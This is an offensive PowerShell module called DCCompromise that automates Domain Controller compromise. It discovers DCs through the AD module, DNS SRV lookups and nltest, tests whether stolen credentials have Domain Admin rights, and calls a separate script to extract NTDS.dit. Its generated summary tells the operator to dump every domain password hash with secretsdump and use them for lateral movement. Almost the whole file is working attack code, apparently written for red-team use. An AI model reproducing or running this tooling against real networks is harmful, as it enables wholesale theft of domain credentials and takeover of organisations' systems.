# ========================================
#   DCCompromise PowerShell Module  
#   Domain Controller Compromise & NTDS Extraction
# ========================================

# Global configuration
$global:DCCompromiseConfig = @{
    OutputDirectory = "C:\Intel\Logs"
    Prefix = "DCCompromise_"
    DomainController = ""
    Username = ""
    Password = ""
    Domain = ""
}

# NTDS Extraction (T1003.003)
function Invoke-NTDSExtraction {
    <#
    .SYNOPSIS
    Extracts NTDS.dit database using domain admin credentials
    .DESCRIPTION
    Maps to MITRE ATT&CK T1003.003 - OS Credential Dumping: NTDS
    #>
    param(
        [string]$DomainController = "",
        [string]$Username = "",
        [string]$Password = "",
        [string]$Domain = "",
        [switch]$UseCurrentCredentials = $false
    )
    
    if ($DomainController) { $global:DCCompromiseConfig.DomainController = $DomainController }
    if ($Username) { $global:DCCompromiseConfig.Username = $Username }
    if ($Password) { $global:DCCompromiseConfig.Password = $Password }
    if ($Domain) { $global:DCCompromiseConfig.Domain = $Domain }
    
    $scriptPath = Join-Path $PSScriptRoot "NTDS Extraction (T1003.003).ps1"
    if (Test-Path $scriptPath) {
        $results = & $scriptPath -DomainController $global:DCCompromiseConfig.DomainController -Username $global:DCCompromiseConfig.Username -Password $global:DCCompromiseConfig.Password -Domain $global:DCCompromiseConfig.Domain -OutputDirectory $global:DCCompromiseConfig.OutputDirectory -UseCurrentCredentials:$UseCurrentCredentials
        
        # Save results
        $outputFile = Join-Path $global:DCCompromiseConfig.OutputDirectory "$($global:DCCompromiseConfig.Prefix)NTDSExtraction.txt"
        Ensure-OutputDirectory
        $results | Format-Table -AutoSize | Out-String | Out-File -FilePath $outputFile -Encoding UTF8
        Write-Host "[+] Results saved to: $outputFile" -ForegroundColor Green
        
        return $results
    } else {
        Write-Error "NTDS Extraction script not found"
    }
}

# Domain Controller Discovery
function Invoke-DCDiscovery {
    <#
    .SYNOPSIS
    Discovers Domain Controllers in the environment
    .DESCRIPTION
    Identifies all DCs for targeting and compromise assessment
    #>
    
    Write-Host "[*] Discovering Domain Controllers..." -ForegroundColor Cyan
    
    $dcResults = @()
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
    
    # Method 1: Active Directory module
    try {
        if (Get-Module -Name ActiveDirectory -ListAvailable) {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
            $adDCs = Get-ADDomainController -Filter * -ErrorAction SilentlyContinue
            
            foreach ($dc in $adDCs) {
                $pingResult = Test-Connection -ComputerName $dc.HostName -Count 1 -Quiet -ErrorAction SilentlyContinue
                
                $dcResults += [PSCustomObject]@{
                    HostName = $dc.HostName
                    Domain = $dc.Domain
                    Forest = $dc.Forest
                    Site = $dc.Site
                    IPv4Address = $dc.IPv4Address
                    OperatingSystem = $dc.OperatingSystem
                    IsGlobalCatalog = $dc.IsGlobalCatalog
                    IsReadOnly = $dc.IsReadOnly
                    IsOnline = if($pingResult) { "Yes" } else { "No" }
                    Roles = ($dc.OperationMasterRoles -join ", ")
                    Method = "Active Directory Module"
                    Timestamp = $timestamp
                    Notes = "Primary target for NTDS extraction"
                }
            }
            
            Write-Host "[+] Found $($adDCs.Count) DCs via AD module" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[!] AD module DC discovery failed" -ForegroundColor Yellow
    }
    
    # Method 2: DNS query for Domain Controllers
    try {
        $domainName = $env:USERDNSDOMAIN
        if ($domainName) {
            $nslookupResult = nslookup -type=srv "_ldap._tcp.$domainName" 2>$null
            $dcEntries = $nslookupResult | Select-String "hostname" 
            
            foreach ($entry in $dcEntries) {
                $hostname = ($entry -split "=")[1].Trim().TrimEnd(".")
                $pingResult = Test-Connection -ComputerName $hostname -Count 1 -Quiet -ErrorAction SilentlyContinue
                
                # Avoid duplicates from AD module
                if (-not ($dcResults | Where-Object { $_.HostName -eq $hostname })) {
                    $dcResults += [PSCustomObject]@{
                        HostName = $hostname
                        Domain = $domainName
                        Forest = "Unknown"
                        Site = "Unknown"
                        IPv4Address = "Unknown"
                        OperatingSystem = "Unknown"
                        IsGlobalCatalog = "Unknown"
                        IsReadOnly = "Unknown"
                        IsOnline = if($pingResult) { "Yes" } else { "No" }
                        Roles = "Unknown"
                        Method = "DNS SRV Query"
                        Timestamp = $timestamp
                        Notes = "Discovered via DNS - verify accessibility"
                    }
                }
            }
            
            Write-Host "[+] Found additional DCs via DNS queries" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[!] DNS DC discovery failed" -ForegroundColor Yellow
    }
    
    # Method 3: nltest fallback
    try {
        $nltestResult = nltest /dclist: 2>$null
        if ($LASTEXITCODE -eq 0) {
            $nltestDCs = $nltestResult | Select-String "\\\\.*" | ForEach-Object {
                ($_ -replace ".*\\\\([^\s]+).*", '$1')
            }
            
            foreach ($hostname in $nltestDCs) {
                $pingResult = Test-Connection -ComputerName $hostname -Count 1 -Quiet -ErrorAction SilentlyContinue
                
                # Avoid duplicates
                if (-not ($dcResults | Where-Object { $_.HostName -eq $hostname })) {
                    $dcResults += [PSCustomObject]@{
                        HostName = $hostname
                        Domain = $env:USERDNSDOMAIN
                        Forest = "Unknown"
                        Site = "Unknown"
                        IPv4Address = "Unknown"
                        OperatingSystem = "Unknown"
                        IsGlobalCatalog = "Unknown"
                        IsReadOnly = "Unknown"
                        IsOnline = if($pingResult) { "Yes" } else { "No" }
                        Roles = "Unknown"
                        Method = "nltest"
                        Timestamp = $timestamp
                        Notes = "Discovered via nltest - basic information only"
                    }
                }
            }
            
            Write-Host "[+] Found additional DCs via nltest" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[!] nltest DC discovery failed" -ForegroundColor Yellow
    }
    
    # Save DC discovery results
    $outputFile = Join-Path $global:DCCompromiseConfig.OutputDirectory "$($global:DCCompromiseConfig.Prefix)DCDiscovery.txt"
    Ensure-OutputDirectory
    $dcResults | Format-Table -AutoSize | Out-String | Out-File -FilePath $outputFile -Encoding UTF8
    Write-Host "[+] DC discovery results saved to: $outputFile" -ForegroundColor Green
    
    return $dcResults
}

# Credential Validation
function Test-DomainAdminCredentials {
    <#
    .SYNOPSIS
    Tests if provided credentials have domain admin privileges
    .DESCRIPTION
    Validates credentials before attempting DC compromise
    #>
    param(
        [string]$Username,
        [string]$Password,
        [string]$Domain = ""
    )
    
    Write-Host "[*] Testing domain admin credentials..." -ForegroundColor Cyan
    
    try {
        # Create credential object
        $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($Username, $securePassword)
        
        # Test 1: Try to access AD with credentials
        if (Get-Module -Name ActiveDirectory -ListAvailable) {
            Import-Module ActiveDirectory -ErrorAction SilentlyContinue
            
            try {
                $testUser = Get-ADUser -Identity $Username -Server $Domain -Credential $credential -ErrorAction Stop
                Write-Host "[+] Credentials successfully authenticated against AD" -ForegroundColor Green
                
                # Test 2: Check if user is in Domain Admins
                $domainAdmins = Get-ADGroupMember -Identity "Domain Admins" -Server $Domain -Credential $credential -ErrorAction SilentlyContinue
                $isDomainAdmin = $domainAdmins | Where-Object { $_.SamAccountName -eq $Username }
                
                if ($isDomainAdmin) {
                    Write-Host "[+] User confirmed as Domain Admin" -ForegroundColor Green
                    return $true
                } else {
                    Write-Host "[!] User authenticated but not in Domain Admins group" -ForegroundColor Yellow
                    return $false
                }
            }
            catch {
                Write-Host "[!] Credential authentication failed: $($_.Exception.Message)" -ForegroundColor Red
                return $false
            }
        } else {
            Write-Host "[!] AD module not available for credential testing" -ForegroundColor Yellow
            return $null  # Cannot test
        }
    }
    catch {
        Write-Host "[!] Credential testing failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Full DC Compromise
function Invoke-FullDCCompromise {
    <#
    .SYNOPSIS
    Executes complete Domain Controller compromise workflow
    .DESCRIPTION
    Discovers DCs, validates credentials, and extracts NTDS.dit database
    #>
    param(
        [string]$Username = "",
        [string]$Password = "",
        [string]$Domain = "",
        [switch]$UseCurrentCredentials = $false
    )
    
    if ($Username) { $global:DCCompromiseConfig.Username = $Username }
    if ($Password) { $global:DCCompromiseConfig.Password = $Password }
    if ($Domain) { $global:DCCompromiseConfig.Domain = $Domain }
    
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "  DOMAIN CONTROLLER COMPROMISE" -ForegroundColor Magenta  
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host ""
    
    Ensure-OutputDirectory
    
    $allResults = @()
    $startTime = Get-Date
    
    Write-Host "[*] Starting complete DC compromise workflow..." -ForegroundColor Cyan
    if (-not $UseCurrentCredentials) {
        Write-Host "[*] Target Credentials: $($global:DCCompromiseConfig.Username)" -ForegroundColor Gray
    } else {
        Write-Host "[*] Using current user credentials" -ForegroundColor Gray
    }
    Write-Host "[*] Output Directory: $($global:DCCompromiseConfig.OutputDirectory)" -ForegroundColor Gray
    Write-Host ""
    
    # Phase 1: Domain Controller Discovery
    Write-Host "=== Domain Controller Discovery ===" -ForegroundColor Yellow
    try {
        $dcResults = Invoke-DCDiscovery
        $allResults += @{ Phase = "DC Discovery"; Results = $dcResults; Count = $dcResults.Count }
        Write-Host "[+] Completed: Found $($dcResults.Count) Domain Controllers" -ForegroundColor Green
        
        # Select primary DC target
        $primaryDC = $dcResults | Where-Object { $_.IsOnline -eq "Yes" } | Select-Object -First 1
        if ($primaryDC) {
            $global:DCCompromiseConfig.DomainController = $primaryDC.HostName
            Write-Host "[+] Primary DC target: $($primaryDC.HostName)" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
        $allResults += @{ Phase = "DC Discovery"; Results = @(); Count = 0; Error = $_.Exception.Message }
    }
    Write-Host ""
    
    # Phase 2: Credential Validation (if not using current creds)
    if (-not $UseCurrentCredentials -and $global:DCCompromiseConfig.Username -and $global:DCCompromiseConfig.Password) {
        Write-Host "=== Credential Validation ===" -ForegroundColor Yellow
        try {
            $credValid = Test-DomainAdminCredentials -Username $global:DCCompromiseConfig.Username -Password $global:DCCompromiseConfig.Password -Domain $global:DCCompromiseConfig.Domain
            
            if ($credValid -eq $true) {
                Write-Host "[+] Credentials validated as Domain Admin" -ForegroundColor Green
                $allResults += @{ Phase = "Credential Validation"; Results = @("Valid Domain Admin"); Count = 1 }
            } elseif ($credValid -eq $false) {
                Write-Host "[!] Credentials invalid or insufficient privileges" -ForegroundColor Red
                $allResults += @{ Phase = "Credential Validation"; Results = @("Invalid Credentials"); Count = 0; Error = "Authentication failed" }
            } else {
                Write-Host "[!] Could not validate credentials (continuing anyway)" -ForegroundColor Yellow
                $allResults += @{ Phase = "Credential Validation"; Results = @("Could not validate"); Count = 0; Error = "Validation unavailable" }
            }
        }
        catch {
            Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
            $allResults += @{ Phase = "Credential Validation"; Results = @(); Count = 0; Error = $_.Exception.Message }
        }
        Write-Host ""
    }
    
    # Phase 3: NTDS.dit Extraction
    Write-Host "=== NTDS.dit Extraction (T1003.003) ===" -ForegroundColor Yellow
    try {
        $ntdsResults = Invoke-NTDSExtraction -DomainController $global:DCCompromiseConfig.DomainController -Username $global:DCCompromiseConfig.Username -Password $global:DCCompromiseConfig.Password -Domain $global:DCCompromiseConfig.Domain -UseCurrentCredentials:$UseCurrentCredentials
        
        $successfulExtractions = $ntdsResults | Where-Object { $_.Status -eq "Success" }
        $allResults += @{ Phase = "NTDS Extraction"; Results = $ntdsResults; Count = $successfulExtractions.Count }
        
        if ($successfulExtractions.Count -gt 0) {
            Write-Host "[+] Completed: $($successfulExtractions.Count) successful NTDS extractions" -ForegroundColor Green
        } else {
            Write-Host "[!] No successful NTDS extractions" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[!] Failed: $($_.Exception.Message)" -ForegroundColor Red
        $allResults += @{ Phase = "NTDS Extraction"; Results = @(); Count = 0; Error = $_.Exception.Message }
    }
    Write-Host ""
    
    # Generate summary report
    $endTime = Get-Date
    $duration = $endTime - $startTime
    
    $summaryReport = @"
========================================
DOMAIN CONTROLLER COMPROMISE SUMMARY
========================================

Execution Details:
- Start Time: $($startTime.ToString("yyyy-MM-dd HH:mm:ss UTC"))
- End Time: $($endTime.ToString("yyyy-MM-dd HH:mm:ss UTC"))  
- Duration: $($duration.ToString("mm\:ss"))
- Target DC: $($global:DCCompromiseConfig.DomainController)
- Credentials: $(if($UseCurrentCredentials) { 'Current User' } else { $global:DCCompromiseConfig.Username })
- Output Location: $($global:DCCompromiseConfig.OutputDirectory)

Compromise Results:
$($allResults | ForEach-Object { 
    if ($_.Error) {
        "- $($_.Phase): FAILED ($($_.Error))"
    } else {
        "- $($_.Phase): $($_.Count) items"
    }
} | Out-String)

MITRE ATT&CK Techniques Executed:
- T1003.003: OS Credential Dumping - NTDS

Files Generated:
$(Get-ChildItem -Path $global:DCCompromiseConfig.OutputDirectory -Filter "$($global:DCCompromiseConfig.Prefix)*" | ForEach-Object { "- $($_.Name)" } | Out-String)

Next Steps:
- Use impacket-secretsdump to extract password hashes from NTDS.dit
- Analyze domain admin and service account passwords
- Use extracted hashes for further lateral movement
"@
    
    $summaryFile = Join-Path $global:DCCompromiseConfig.OutputDirectory "$($global:DCCompromiseConfig.Prefix)CompromiseSummary.txt"
    $summaryReport | Out-File -FilePath $summaryFile -Encoding UTF8
    
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host "  DC COMPROMISE COMPLETE" -ForegroundColor Magenta
    Write-Host "========================================" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "Summary:" -ForegroundColor Green
    $allResults | Where-Object { -not $_.Error } | ForEach-Object {
        Write-Host "✓ $($_.Phase): $($_.Count) items" -ForegroundColor Green
    }
    $allResults | Where-Object { $_.Error } | ForEach-Object {
        Write-Host "✗ $($_.Phase): Failed" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "Results saved to: $($global:DCCompromiseConfig.OutputDirectory)" -ForegroundColor Cyan
    Write-Host "Summary report: $summaryFile" -ForegroundColor Cyan
    
    # Check if NTDS extraction was successful
    $ntdsSuccess = $allResults | Where-Object { $_.Phase -eq "NTDS Extraction" -and $_.Count -gt 0 }
    if ($ntdsSuccess) {
        Write-Host ""
        Write-Host "[!] CRITICAL: NTDS.dit SUCCESSFULLY EXTRACTED!" -ForegroundColor Red
        Write-Host "[!] Domain password hashes now available for analysis" -ForegroundColor Red
        Write-Host "[!] Use secretsdump.py to extract all domain credentials" -ForegroundColor Red
    }
    
    return $allResults
}

# Utility Functions
function Ensure-OutputDirectory {
    if (-not (Test-Path $global:DCCompromiseConfig.OutputDirectory)) {
        try {
            New-Item -ItemType Directory -Path $global:DCCompromiseConfig.OutputDirectory -Force | Out-Null
            Write-Host "[+] Created output directory: $($global:DCCompromiseConfig.OutputDirectory)" -ForegroundColor Green
        }
        catch {
            Write-Error "Failed to create output directory: $($_.Exception.Message)"
        }
    }
}

function Get-DCCompromiseResults {
    <#
    .SYNOPSIS
    Retrieves and displays DC compromise results
    .DESCRIPTION
    Shows summary of DC compromise results from output directory
    #>
    
    if (-not (Test-Path $global:DCCompromiseConfig.OutputDirectory)) {
        Write-Host "[!] No results found. Run Invoke-FullDCCompromise first." -ForegroundColor Yellow
        return
    }
    
    $resultFiles = Get-ChildItem -Path $global:DCCompromiseConfig.OutputDirectory -Filter "$($global:DCCompromiseConfig.Prefix)*"
    
    if ($resultFiles.Count -eq 0) {
        Write-Host "[!] No DC compromise results found." -ForegroundColor Yellow
        return
    }
    
    Write-Host "Domain Controller Compromise Results:" -ForegroundColor Cyan
    Write-Host "Location: $($global:DCCompromiseConfig.OutputDirectory)" -ForegroundColor Gray
    Write-Host ""
    
    foreach ($file in $resultFiles) {
        $fileSize = [math]::Round($file.Length / 1KB, 2)
        Write-Host "🏰 $($file.Name) ($fileSize KB)" -ForegroundColor White
        Write-Host "   Modified: $($file.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss"))" -ForegroundColor Gray
        Write-Host ""
    }
    
    # Check for NTDS files specifically
    $ntdsDir = Join-Path $global:DCCompromiseConfig.OutputDirectory "NTDS_Extraction"
    if (Test-Path $ntdsDir) {
        Write-Host "NTDS Extraction Files:" -ForegroundColor Red
        $ntdsFiles = Get-ChildItem -Path $ntdsDir -Recurse -File
        foreach ($file in $ntdsFiles) {
            $fileSize = [math]::Round($file.Length / 1MB, 2)
            Write-Host "💀 $($file.Name) ($fileSize MB)" -ForegroundColor Red
        }
    }
}

function Set-DCCompromiseConfig {
    <#
    .SYNOPSIS
    Configure DC compromise settings
    .DESCRIPTION
    Sets credentials and target DC information
    #>
    param(
        [string]$Username,
        [string]$Password,
        [string]$Domain,
        [string]$DomainController,
        [string]$OutputDirectory
    )
    
    if ($Username) { 
        $global:DCCompromiseConfig.Username = $Username 
        Write-Host "[+] Username set to: $Username" -ForegroundColor Green
    }
    if ($Password) { 
        $global:DCCompromiseConfig.Password = $Password 
        Write-Host "[+] Password configured" -ForegroundColor Green
    }
    if ($Domain) { 
        $global:DCCompromiseConfig.Domain = $Domain 
        Write-Host "[+] Domain set to: $Domain" -ForegroundColor Green
    }
    if ($DomainController) { 
        $global:DCCompromiseConfig.DomainController = $DomainController 
        Write-Host "[+] Domain Controller set to: $DomainController" -ForegroundColor Green
    }
    if ($OutputDirectory) { 
        $global:DCCompromiseConfig.OutputDirectory = $OutputDirectory 
        Write-Host "[+] Output directory set to: $OutputDirectory" -ForegroundColor Green
    }
}

# Aliases for convenience
New-Alias -Name "Run-DCCompromise" -Value "Invoke-FullDCCompromise" -Force
New-Alias -Name "Get-DCResults" -Value "Get-DCCompromiseResults" -Force

# Export functions
Export-ModuleMember -Function @(
    'Invoke-NTDSExtraction',
    'Invoke-DCDiscovery',
    'Test-DomainAdminCredentials',
    'Invoke-FullDCCompromise',
    'Get-DCCompromiseResults',
    'Set-DCCompromiseConfig'
) -Alias @('Run-DCCompromise', 'Get-DCResults')